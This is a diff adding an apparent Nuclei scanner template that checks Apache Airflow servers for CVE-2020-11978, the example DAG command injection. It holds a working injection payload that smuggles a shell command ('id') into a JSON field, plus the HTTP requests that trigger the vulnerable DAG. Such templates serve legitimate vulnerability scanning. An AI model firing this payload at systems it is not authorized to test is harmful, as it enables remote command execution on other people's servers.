@@ -1,0 +1,52 @@
+id: apache-airflow-example-dag-rce
+
+info:
+  name: Apache Airflow Example Dag RCE (CVE-2020-11978)
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    An issue was found in Apache Airflow versions 1.10.10 and below. A remote code/command injection vulnerability was discovered in one of the example DAGs shipped with Airflow which would allow any authenticated user to run arbitrary commands as the user running airflow worker/scheduler (depending on the executor in use). If you already have examples disabled by setting load_examples=False in the config then you are not vulnerable.
+  classification:
+    cve-id: CVE-2020-11978
+    cvss-metrics: "AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"
+    cvss-score: 8.8
+  tags: command-injection, rce
+
+variables:
+  payload: '{"conf": {"message": "\"; id #\""}}'
+
+http:
+  - name: Check DAG availability
+    method: GET
+    path:
+      - "/api/experimental/dags/example_trigger_target_dag/tasks/bash_task"
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "dag_run"
+    extractors:
+      - type: regex
+        part: body
+        name: dag_verification
+        regex:
+          - "dag_run"
+
+  - name: Trigger DAG execution
+    method: POST
+    path:
+      - "/api/experimental/dags/example_trigger_target_dag/dag_runs"
+    headers:
+      Content-Type: application/json
+    body: "{{payload}}"
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "example_trigger_target_dag"
